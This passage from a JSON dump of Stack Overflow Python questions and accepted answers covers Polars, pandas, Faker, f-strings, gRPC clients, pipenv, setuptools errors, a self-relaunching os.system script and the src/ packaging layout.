    "AcceptedAnswer": "Context\nPyspark uses arrow to convert to pandas. Polars is an abstraction over arrow memory. So we can hijack the API that spark uses internally to create the arrow data and use that to create the polars DataFrame.\nTLDR\nGiven an spark context we can write:\nimport pyarrow as pa\nimport polars as pl\n\nsql_context = SQLContext(spark)\n\ndata = [('James',[1, 2]),]\nspark_df = sql_context.createDataFrame(data=data, schema = [\"name\",\"properties\"])\n\ndf = pl.from_arrow(pa.Table.from_batches(spark_df._collect_as_arrow()))\n\nprint(df)\n\nshape: (1, 2)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 name  \u2506 properties \u2502\n\u2502 ---   \u2506 ---        \u2502\n\u2502 str   \u2506 list[i64]  \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 James \u2506 [1, 2]     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSerialization steps\nThis will actually be faster than the toPandas provided by spark itself, because it saves an extra copy.\ntoPandas() will lead to this serialization/copy step:\nspark-memory -> arrow-memory -> pandas-memory\nWith the query provided we have:\nspark-memory -> arrow/polars-memory\n"
}
{
    "Id": 73206810,
    "PostTypeId": 1,
    "Title": "Faker Python generating chinese/pinyin names",
    "Body": "I am trying to generate random chinese names using Faker (Python), but it generates the names in chinese characters instead of pinyin.\nI found this :\n\nand it show that it generates them in pinyin, while when I try the same code, it gives me only chinese characters.\nhow to get the pinyin ??\n",
    "AcceptedAnswerId": 73206894,
    "AcceptedAnswer": "fake.romanized_name() worked for me.\nI got lucky by looking through dir(fake). Doesn't seem to have a method for pinyin address that I can see...\n"
}
{
    "Id": 73641835,
    "PostTypeId": 1,
    "Title": "Unnesting event parameters in JSON format within a Pandas dataframe",
    "Body": "I have a dataset that looks like the one below.  It is relational, but has a dimension called event_params which is a JSON object of data related to the event_name in the respective row.\nimport pandas as pd\n\na_df = pd.DataFrame(data={\n    'date_time': ['2021-01-03 15:12:42', '2021-01-03 15:12:46', '2021-01-03 15:13:01'\n                  , '2021-01-03 15:13:12', '2021-01-03 15:13:13', '2021-01-03 15:13:15'\n                  , '2021-01-04 03:29:01', '2021-01-04 18:15:14', '2021-01-04 18:16:01'],\n    'user_id': ['dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', '38nr10', '38nr10', '38nr10'],\n    'account_id': ['181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '56sf15', '56sf15', '56sf15'],\n    'event_name': ['button_click', 'screen_view', 'close_view', 'button_click', 'exit_app', 'uninstall_app'\n                   , 'install_app', 'exit_app', 'uninstall_app'],\n    'event_params': ['{\\'button_id\\': \\'shop_screen\\', \\'button_container\\': \\'main_screen\\', \\'button_label_text\\': \\'Enter Shop\\'}',\n                     '{\\'screen_id\\': \\'shop_main_page\\', \\'screen_controller\\': \\'main_view_controller\\', \\'screen_title\\': \\'Main Menu\\'}',\n                     '{\\'screen_id\\': \\'shop_main_page\\'}',\n                     '{\\'button_id\\': \\'back_to_main_menu\\', \\'button_container\\': \\'shop_screen\\', \\'button_label_text\\': \\'Exit Shop\\'}',\n                     '{}',\n                     '{}',\n                     '{\\'utm_campaign\\': \\'null\\', \\'utm_source\\': \\'null\\'}',\n                     '{}',\n                     '{}']\n    })\n\nI am looking for approaches on how to handle this sort of data.  My initial approach is with pandas, but I'm open to other methods.\nMy ideal end state would be to examine each relationships with respect to each user.  In the current form, I have to compare the dicts/JSON blobs sitting in event_params to determine the context behind an event.\nI've tried using explode() to expand out the event_params column.  My thinking is the best sort of approach would be to turn event_params into a relational format, where each parameter is an extra row of the dataframe with respect to it's preceding values (in other words, while maintaining the date_time, user_id and event_name that it was related too initially).\nMy explode approach didn't work well,\na_df['event_params'] = a_df['event_params'].apply(eval)\nexploded_df = a_df.explode('event_params')\n\nThe output of that was:\ndate_time, user_id, account_id, event_name, event_params\n2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_id\n2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_container\n\nIt has kind of worked, but it stripped the value fields.  Ideally I'd like to maintain those value fields as well.\n",
    "AcceptedAnswerId": 73641899,
    "AcceptedAnswer": "I hope I've understood your question right. You can transform the event_params column from dict to list of dicts, explode it and transform to new columns key/value:\nfrom ast import literal_eval\n\n\na_df = a_df.assign(\n    event_params=a_df[\"event_params\"].apply(\n        lambda x: [{\"key\": k, \"value\": v} for k, v in literal_eval(x).items()]\n    )\n).explode(\"event_params\")\n\na_df = pd.concat(\n    [a_df, a_df.pop(\"event_params\").apply(pd.Series)],\n    axis=1,\n).drop(columns=0)\n\nprint(a_df)\n\nPrints:\n             date_time user_id account_id     event_name                key                 value\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click          button_id           shop_screen\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click   button_container           main_screen\n0  2021-01-03 15:12:42  dhj13h     181d9k   button_click  button_label_text            Enter Shop\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view          screen_id        shop_main_page\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view  screen_controller  main_view_controller\n1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view       screen_title             Main Menu\n2  2021-01-03 15:13:01  dhj13h     181d9k     close_view          screen_id        shop_main_page\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click          button_id     back_to_main_menu\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click   button_container           shop_screen\n3  2021-01-03 15:13:12  dhj13h     181d9k   button_click  button_label_text             Exit Shop\n4  2021-01-03 15:13:13  dhj13h     181d9k       exit_app                NaN                   NaN\n5  2021-01-03 15:13:15  dhj13h     181d9k  uninstall_app                NaN                   NaN\n6  2021-01-04 03:29:01  38nr10     56sf15    install_app       utm_campaign                  null\n6  2021-01-04 03:29:01  38nr10     56sf15    install_app         utm_source                  null\n7  2021-01-04 18:15:14  38nr10     56sf15       exit_app                NaN                   NaN\n8  2021-01-04 18:16:01  38nr10     56sf15  uninstall_app                NaN                   NaN\n\n"
}
{
    "Id": 72405196,
    "PostTypeId": 1,
    "Title": "Append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s",
    "Body": "I want this code to append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s.\nThat's my current code below and it is appending 1 for all occurences, I want it to append 1 for the first occurence alone. Please, help\ns = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]\np = [0, 13]\nbin = []\n\nfor i in s:\n        if i in p:        \n            bin.append(1)      \n        else:\n            bin.append(0)\n   \n\nprint(bin)\n\n# current result [0, 0, 1, 0, 1, 1, 0, 0, 0, 1]\n# excepted result [0, 0, 1, 0, 1, 0, 0, 0, 0, 0]\n\n",
    "AcceptedAnswerId": 72405259,
    "AcceptedAnswer": "The simplest solution is to remove the item from list p if found:\ns = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]\np = [0, 13]\n\nout = []\nfor i in s:\n    if i in p:\n        out.append(1)\n        p.remove(i)\n    else:\n        out.append(0)\n\nprint(out)\n\nPrints:\n[0, 0, 1, 0, 1, 0, 0, 0, 0, 0]\n\n"
}
{
    "Id": 72449482,
    "PostTypeId": 1,
    "Title": "f-string representation different than str()",
    "Body": "I had always thought that f-strings invoked the __str__ method.  That is, f'{x}' was always the same as str(x).  However, with this class\nclass Thing(enum.IntEnum):\n    A = 0\n\nf'{Thing.A}' is '0' while str(Thing.A) is 'Thing.A'.  This example doesn't work if I use enum.Enum as the base class.\nWhat functionality do f-strings invoke?\n",
    "AcceptedAnswerId": 72449614,
    "AcceptedAnswer": "From \"Formatted string literals\" in the Python reference:\nf-strings are invoke the \"format protocol\", same as the format built-in function. It means that the __format__ magic method is called instead of __str__.\nclass Foo:\n    def __repr__(self):\n        return \"Foo()\"\n\n    def __str__(self):\n        return \"A wild Foo\"\n    \n    def __format__(self, format_spec):\n        if not format_spec:\n            return \"A formatted Foo\"\n        return f\"A formatted Foo, but also {format_spec}!\"\n\n>>> foo = Foo()\n>>> repr(foo)\n'Foo()'\n>>> str(foo)\n'A wild Foo'\n>>> format(foo)\n'A formatted Foo'\n>>> f\"{foo}\"\n'A formatted Foo'\n>>> format(foo, \"Bar\")\n'A formatted Foo, but also Bar!'\n>>> f\"{foo:Bar}\"\n'A formatted Foo, but also Bar!'\n\nIf you don't want __format__ to be called, you can specify !s (for str), !r (for repr) or !a (for ascii) after the expression:\n>>> foo = Foo()\n>>> f\"{foo}\"\n'A formatted Foo'\n>>> f\"{foo!s}\"\n'A wild Foo'\n>>> f\"{foo!r}\"\n'Foo()'\n\nThis is occasionally useful with strings:\n>>> key = 'something\\n nasty!'\n>>> error_message = f\"Key not found: {key!r}\"\n>>> error_message\n\"Key not found: 'something\\\\n nasty!'\"\n\n"
}
{
    "Id": 72598852,
    "PostTypeId": 1,
    "Title": "getCacheEntry failed: Cache service responded with 503",
    "Body": "I am trying to check the lint on the gitubaction. my github action steps are as below\n  lint:\n    name: Lint\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v3\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version-file: '.python-version'\n          cache: 'pip'\n          cache-dependency-path: 'requirements.txt'\n\nError screenshot   Attached below\n\nCould you please help me how to fix this?\n",
    "AcceptedAnswerId": 72629158,
    "AcceptedAnswer": "lint:\nname: Lint\nruns-on: ubuntu-latest\nsteps:\n  - name: Checkout\n    uses: actions/checkout@v3\n  - name: Set up Python\n    uses: actions/setup-python@v4\n    with:\n      python-version-file: '.python-version'\n  - name: Cache dependencies\n    uses: actions/cache@v3\n    with:\n      path: ~/.cache/pip\n      key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}\n      restore-keys: |\n          ${{ runner.os }}-pip-\n          ${{ runner.os }}-\n\nI too faced the same problem. It is because of the cache server not responding that includes internal server error or any other.\nYou can use actions/cache@v3 instead of the automatic cache by python using cache: 'pip' because the action/cache does the same  but only gives warning on the server error\n"
}
{
    "Id": 72710695,
    "PostTypeId": 1,
    "Title": "Controlling context manager in a meta class",
    "Body": "I would like to know if it's possible to control the context automatically in a metaclass and decorator. I have written a decorator function that creates the stub from the grpc insecure channel:\ndef grpc_factory(grpc_server_address: str):\n    print(\"grpc_factory\")\n    def grpc_connect(func):\n        print(\"grpc_connect\")\n        def grpc_connect_wrapper(*args, **kwargs):\n            with grpc.insecure_channel(grpc_server_address) as channel:\n                stub = AnalyserStub(channel)\n                return func(*args, stub=stub, **kwargs)\n        return grpc_connect_wrapper\n    return grpc_connect\n\nI have then created a metaclass that uses the context manager with every method that starts with grpc_ and then injects the stub into the methods kwargs:\nclass Client(type):\n    @classmethod\n    def __prepare__(metacls, name, bases, **kwargs):\n        return super().__prepare__(name, bases, **kwargs)\n\n    def __new__(cls, name, bases, attrs, **kwargs):\n        if \"grpc_server_address\" not in kwargs:\n            raise ValueError(\"\"\"grpc_server_address is required on client class, see below example\\n\n            class MyClient(AnalyserClient, metaclass=Client, grpc_server_address='localhost:50051')\"\"\")\n        for key, value in attrs.items():\n            if callable(value) and key.startswith(\"grpc_\"):\n                attrs[key] = grpc_factory(kwargs[\"grpc_server_address\"])(value)\n        return super().__new__(cls, name, bases, attrs)\n\nFrom this, I'd like to create all of the methods from the proto file not implemented errors:\nclass AnalyserClient(metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, *args, **kwargs):\n        raise NotImplementedError(\"grpc_analyse is not implemented\")\n\nWith a final use case of the class below with the stub placed into the methods args:\nclass AnalyserClient(AC, metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, text, stub) -> str:\n        print(\"Analysing text: {}\".format(text))\n        print(\"Stub is \", stub)\n        stub.AnalyseSentiment(text)\n        return \"Analysed\"\n\nI am getting this error which I assume means the channel is no longer open but I'm not sure how this could be done better to ensure all users have a simple interface with safety around using the services defined in the proto file.\ngrpc_factory\ngrpc_connect\ngrpc_factory\ngrpc_connect\nInside grpc_connect_wrapper\nCreated channel\nAnalysing text: Hello World\nStub is  \nERROR:grpc._common:Exception serializing message!\nTraceback (most recent call last):\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_common.py\", line 86, in _transform\n    return transformer(message)\nTypeError: descriptor 'SerializeToString' for 'google.protobuf.pyext._message.CMessage' objects doesn't apply to a 'str' object\nTraceback (most recent call last):\n  File \"run_client.py\", line 27, in \n    client.grpc_analyse(\"Hello World\")\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/grpc_implementation/client/client.py\", line 15, in grpc_connect_wrapper\n    return func(*args, stub=stub, **kwargs)\n  File \"run_client.py\", line 11, in grpc_analyse\n    stub.AnalyseSentiment(text)\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py\", line 944, in __call__\n    state, call, = self._blocking(request, timeout, metadata, credentials,\n  File \"/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py\", line 924, in _blocking\n    raise rendezvous  # pylint: disable-msg=raising-bad-type\ngrpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:\n        status = StatusCode.INTERNAL\n        details = \"Exception serializing request!\"\n        debug_error_string = \"None\"\n\nThe proto file is:\nsyntax = \"proto3\";\n\npackage analyse;\noption go_package = \"./grpc_implementation\";\n\nservice Analyser {\n  rpc AnalyseSentiment(SentimentRequest) returns (SentimentResponse) {}\n}\n\nmessage SentimentRequest {\n  string text = 1;\n}\n\nmessage SentimentResponse {\n  string sentiment = 1;\n}\n\nBelow is the class I am trying to emulate after the metaclass has added decorator.\nclass AnalyserClientTrad:\n    def __init__(self, host: str = \"localhost:50051\"):\n        self.host = host\n\n    def grpc_analyse(self, text: str):\n        with grpc.insecure_channel(self.host) as channel:\n            stub = AnalyserStub(channel)\n            response = stub.AnalyseSentiment(SentimentRequest(text=text))\n            return response.sentiment\n\nclient = AnalyserClientTrad()\nprint(client.grpc_analyse(\"Hello, world!\"))\n\nI have further tested this through adding the decorator traditionally which also works:\ndef grpc_factory(grpc_server_address: str):\n    def grpc_connect(func):\n        def grpc_connect_wrapper(*args, **kwargs):\n            with grpc.insecure_channel(grpc_server_address) as channel:\n                stub = AnalyserStub(channel)\n                return func(*args, stub=stub, **kwargs)\n        return grpc_connect_wrapper\n    return grpc_connect\n\n\n\nclass AnalyserClientTradWithDecs:\n    @grpc_factory(\"localhost:50051\")\n    def grpc_analyse(self, text: str, stub: AnalyserStub):\n        response = stub.AnalyseSentiment(SentimentRequest(text=text))\n        return response.sentiment\n\ndef run_client_with_decorator():\n    client = AnalyserClientTradWithDecs()\n    print(client.grpc_analyse(\"Hello, world!\"))\n\nAny help would be appreciated.\n",
    "AcceptedAnswerId": 72725749,
    "AcceptedAnswer": "You have a problem in this part of the code, that your are not setting an expected proto object instead you are setting string\nclass AnalyserClient(AC, metaclass=Client, grpc_server_address=\"localhost:50051\"):\n    def grpc_analyse(self, text, stub) -> str:\n        print(\"Analysing text: {}\".format(text))\n        print(\"Stub is \", stub)\n        stub.AnalyseSentiment(text) #--> Error, use a proto object here.\n        return \"Analysed\"\n\nThe correct way would be to change the line stub.AnalyseSentiment(text) , with\nstub.AnalyseSentiment(SentimentRequest(text=text))\n\n"
}
{
    "Id": 73662432,
    "PostTypeId": 1,
    "Title": "pipenv No such option: --requirements in latest version",
    "Body": "command: pipenv lock --requirements --keep-outdated\noutput:\nUsage: pipenv lock [OPTIONS]\nTry 'pipenv lock -h' for help.\n\nError: No such option: --requirements Did you mean --quiet?\n\nAny idea how to fix this?\n",
    "AcceptedAnswerId": 73681737,
    "AcceptedAnswer": "the -r option on pipenv lock command is deprecated for some time. use the requirements option to generate the requirements.txt\nie:\npipenv requirements > requirements.txt (Default dependencies)\nand to freeze dev dependencies as well use the --dev option\npipenv requirements --dev > dev-requirements.txt\n\nSometimes, you would want to generate a requirements file based on your current environment, for example to include tooling that only supports requirements.txt. You can convert a Pipfile and Pipfile.lock into a requirements.txt file very easily.\n\nsee also: https://pipenv.pypa.io/en/latest/advanced/#generating-a-requirements-txt\n"
}
{
    "Id": 72414481,
    "PostTypeId": 1,
    "Title": "Error in anyjson setup command: use_2to3 is invalid",
    "Body": "#25 3.990   \u00d7 python setup.py egg_info did not run successfully.\n#25 3.990   \u2502 exit code: 1\n#25 3.990   \u2570\u2500> [1 lines of output]\n#25 3.990       error in anyjson setup command: use_2to3 is invalid.\n#25 3.990       [end of output]\n\nThis is a common error which the most common solution to is to downgrade setuptools to below version 58. This was not working for me. I tried installing python3-anyjson but this didn't work either. I'm at a complete loss.. any advice or help is much appreciated.\nIf it matters: this application is legacy spaghetti and I am trying to polish it up for a migration. There's no documentation of any kind.\nThe requirements.txt is as follows:\ncachetools>=2.0.0,<4\ncertifi==2018.10.15\nFlask-Caching\nFlask-Compress\nFlask==2.0.3\ncffi==1.2.1\ndiskcache\nearthengine-api==0.1.239\ngevent==21.12.0\ngoogle-auth>=1.17.2\ngoogle-api-python-client==1.12.1\ngunicorn==20.1.0\nhttplib2.system-ca-certs-locater\nhttplib2==0.9.2\noauth2client==2.0.1\npyasn1-modules==0.2.1\nredis\nrequests==2.18.0\nwerkzeug==2.1.2\nsix==1.13.0\npyasn1==0.4.1\nJinja2==3.1.1\nitsdangerous==2.0.1\n\n\nFlask-Celery-Helper\nFlask-JWT==0.2.0\nFlask-Limiter\nFlask-Mail\nFlask-Migrate\nFlask-Restless==0.16.0\nFlask-SQLAlchemy\nFlask-Script\nFlask-Testing\nFlask==2.0.3\nPillow<=6.2.2\nShapely\nbeautifulsoup4\nboto\ncelery==3.1.23\ngeopy\ngevent==21.12.0\nnumpy<1.17\noauth2client==2.0.1\npasslib\npsycopg2\npyproj<2\npython-dateutil==2.4.1\nscipy\n\n",
    "AcceptedAnswerId": 72774617,
    "AcceptedAnswer": "Downgrading setuptools worked for me\npip install \"setuptools<58.0.0\"\n\nAnd then\npip install django-celery\n\n"
}
{
    "Id": 73166250,
    "PostTypeId": 1,
    "Title": "Why does a recursive Python program not crash my system?",
    "Body": "I've written an R.py script which contains the following two lines:\nimport os\n\nos.system(\"python3 R.py\")\n\nI expected my system to run out of memory after running this script for a few minutes, but it is still surprisingly responsive. Does someone know, what kind of Python interpreter magic is happening here?\n",
    "AcceptedAnswerId": 73216511,
    "AcceptedAnswer": "Preface\nos.system() is actually a call to C\u2019s system().\nHere is what the documentation states:\n\nThe system() function shall behave as if a child process were created\nusing fork(), and the child process invoked the sh utility using\nexecl() as follows:\nexecl(, \"sh\", \"-c\", command, (char *)0);\nwhere  is an unspecified pathname for the sh utility. It\nis unspecified whether the handlers registered with pthread_atfork()\nare called as part of the creation of the child process.\nThe system() function shall ignore the SIGINT and SIGQUIT signals, and\nshall block the SIGCHLD signal, while waiting for the command to\nterminate. If this might cause the application to miss a signal that\nwould have killed it, then the application should examine the return\nvalue from system() and take whatever action is appropriate to the\napplication if the command terminated due to receipt of a signal.\nThe system() function shall not affect the termination status of any\nchild of the calling processes other than the process or processes it\nitself creates.\nThe system() function shall not return until the child process has\nterminated. [Option End]\nThe system() function need not be thread-safe.\n\nSolution\nsystem() creates a child process and exits, there is no stack to be resolved, therefore one would expect this to run as long as resources to do so are available. Furthermore, the operation being of creating a child process is not an intensive one\u2014 the processes aren't using up much resources, but if allowed to run long enough the script will to start to affect general performance and eventually run out of memory to spawn a new child process. Once this occurs the processes will exit.\nExample\nTo demonstrate this, set recursion depth limit to 10 and allow the program to run:\nimport os, sys, inspect\n\nsys.setrecursionlimit(10)\n\nargs = sys.argv[1:]\narg = int(args[0]) if len(args) else 0\n\nstack_depth = len(inspect.stack(0))\n\nprint(f\"Iteration {arg} - at stack depth of {stack_depth}\")\n\narg += 1\n\nos.system(f\"python3 main.py {arg}\")\n\n\nOutputs:\nIteration 0 - at stack depth of 1 - avaialable memory 43337904128 \nIteration 1 - at stack depth of 1 - avaialable memory 43370692608 \nIteration 2 - at stack depth of 1 - avaialable memory 43358756864 \nIteration 3 - at stack depth of 1 - avaialable memory 43339202560 \nIteration 4 - at stack depth of 1 - avaialable memory 43354894336 \nIteration 5 - at stack depth of 1 - avaialable memory 43314974720 \nIteration 6 - at stack depth of 1 - avaialable memory 43232366592 \nIteration 7 - at stack depth of 1 - avaialable memory 43188719616 \nIteration 8 - at stack depth of 1 - avaialable memory 43173384192 \nIteration 9 - at stack depth of 1 - avaialable memory 43286093824 \nIteration 10 - at stack depth of 1 - avaialable memory 43288162304\nIteration 11 - at stack depth of 1 - avaialable memory 43310637056\nIteration 12 - at stack depth of 1 - avaialable memory 43302408192\nIteration 13 - at stack depth of 1 - avaialable memory 43295440896\nIteration 14 - at stack depth of 1 - avaialable memory 43303870464\nIteration 15 - at stack depth of 1 - avaialable memory 43303870464\nIteration 16 - at stack depth of 1 - avaialable memory 43296256000\nIteration 17 - at stack depth of 1 - avaialable memory 43286032384\nIteration 18 - at stack depth of 1 - avaialable memory 43246657536\nIteration 19 - at stack depth of 1 - avaialable memory 43213336576\nIteration 20 - at stack depth of 1 - avaialable memory 43190259712\nIteration 21 - at stack depth of 1 - avaialable memory 43133902848\nIteration 22 - at stack depth of 1 - avaialable memory 43027984384\nIteration 23 - at stack depth of 1 - avaialable memory 43006255104\n...\n\nhttps://replit.com/@pygeek1/os-system-recursion#main.py\nReferences\nhttps://pubs.opengroup.org/onlinepubs/9699919799/functions/system.html\n"
}
{
    "Id": 72712965,
    "PostTypeId": 1,
    "Title": "Does the src/ folder in PyPI packaging have a special meaning or is it only a convention?",
    "Body": "I'm learning how to package Python projects for PyPI according to the tutorial (https://packaging.python.org/en/latest/tutorials/packaging-projects/). For the example project, they use the folder structure:\npackaging_tutorial/\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 src/\n\u2502   \u2514\u2500\u2500 example_package_YOUR_USERNAME_HERE/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u2514\u2500\u2500 example.py\n\u2514\u2500\u2500 tests/\n\nI am just wondering why the src/ folder is needed? Does it serve a particular purpose? Could one instead include the package directly in the top folder? E.g. would\npackaging_tutorial/\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 example_package_YOUR_USERNAME_HERE/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 example.py\n\u2514\u2500\u2500 tests/\n\nhave any disadvantages or cause complications?\n",
    "AcceptedAnswerId": 72792078,
    "AcceptedAnswer": "There is an interesting blog post about this topic; basically, using src prevents that when running tests from within the project directory, the package source folder gets imported instead of the installed package (and tests should always run against installed packages, so that the situation is the same as for a user).\nConsider the following example project where the name of the package under development is mypkg. It contains an __init__.py file and another DATA.txt non-code resource:\n.\n\u251c\u2500\u2500 mypkg\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 DATA.txt\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 __init__.py\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 setup.cfg\n\u2514\u2500\u2500 test\n    \u2514\u2500\u2500 test_data.py\n\nHere, mypkg/__init__.py accesses the DATA.txt resource and loads its content:\nfrom importlib.resources import read_text\n  \ndata = read_text('mypkg', 'DATA.txt').strip()  # The content is 'foo'.\n\nThe script test/test_data.py checks that mypkg.data actually contains 'foo':\nimport mypkg\n  \ndef test():\n    assert mypkg.data == 'foo'\n\nNow, running coverage run -m pytest from within the base directory gives the impression that everything is alright with the project:\n$ coverage run -m pytest\n[...]\ntest/test_data.py .                                             [100%]\n\n========================== 1 passed in 0.01s ==========================\n\nHowever, there's a subtle issue. Running coverage run -m pytest invokes pytest via python -m pytest, i.e. using the -m switch. This has a \"side effect\", as mentioned in the docs:\n\n[...] As with the -c option, the current directory will be added to the start of sys.path. [...]\n\nThis means that when importing mypkg in test/test_data.py, it didn't import the installed version but it imported the package from the source tree in mypkg instead.\nNow, let's further assume that we forgot to include the DATA.txt resource in our project specification (after all, there is no MANIFEST.in). So this file is actually not included in the installed version of mypkg (installation e.g. via python -m pip install .). This is revealed by running pytest directly:\n$ pytest\n[...]\n======================= short test summary info =======================\nERROR test/test_data.py - FileNotFoundError: [Errno 2] No such file ...\n!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!\n========================== 1 error in 0.13s ===========================\n\nHence, when using coverage the test passed despite the installation of mypkg being broken. The test didn't capture this as it was run against the source tree rather than the installed version. If we had used a src directory to contain the mypkg package, then adding the current working directory via -m would have caused no problems, as there is no package mypkg in the current working directory anymore.\nBut in the end, using src is not a requirement but more of a convention/best practice. For example requests doesn't use src and they still manage to be a popular and successful project.\n"
}
{
    "Id": 73699500,
    "PostTypeId": 1,
    "Title": "python-polars split string column into many columns by delimiter",
    "Body": "In pandas, the following code will split the string from col1 into many columns. is there a way to do this in polars?\nd = {'col1': [\"a/b/c/d\", \"a/b/c/d\"]}\ndf= pd.DataFrame(data=d)\ndf[[\"a\",\"b\",\"c\",\"d\"]]=df[\"col1\"].str.split('/',expand=True)\n\n",
    "AcceptedAnswerId": 73703650,
    "AcceptedAnswer": "Here's an algorithm that will automatically adjust for the required number of columns -- and should be quite performant.\nLet's start with this data.  Notice that I've purposely added the empty string \"\" and a null value - to show how the algorithm handles these values.  Also, the number of split strings varies widely.\nimport polars as pl\ndf = pl.DataFrame(\n    {\n        \"my_str\": [\"cat\", \"cat/dog\", None, \"\", \"cat/dog/aardvark/mouse/frog\"],\n    }\n)\ndf\n\nshape: (5, 1)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 my_str                      \u2502\n\u2502 ---                         \u2502\n\u2502 str                         \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 cat                         \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 cat/dog                     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 null                        \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502                             \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 cat/dog/aardvark/mouse/frog \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nThe Algorithm\nThe algorithm below may be a bit more than you need, but you can edit/delete/add as you need.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n    .pivot(\n        index=['id', 'my_str'],\n        values='split_str',\n        columns='col_nm',\n    )\n    .with_column(\n        pl.col('^string_.*$').fill_null(\"\")\n    )\n)\n\nshape: (5, 7)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 string_00 \u2506 string_01 \u2506 string_02 